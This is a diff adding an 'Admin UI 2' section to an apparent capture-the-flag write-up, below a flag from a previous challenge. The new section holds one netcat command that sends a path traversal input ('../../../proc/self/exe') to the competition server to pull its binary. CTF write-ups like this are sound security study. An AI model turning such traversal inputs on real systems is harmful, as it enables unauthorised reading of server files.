@@ -51,3 +51,9 @@ CTF{I_g0T_m4d_sk1lLz}
 ```
 
 Yep, that's it.
+
+## Admin UI 2
+
+```
+$ echo -e "2\n../../../proc/self/exe" | nc mngmnt-iface.ctfcompetition.com 1337 > data.bin
+```
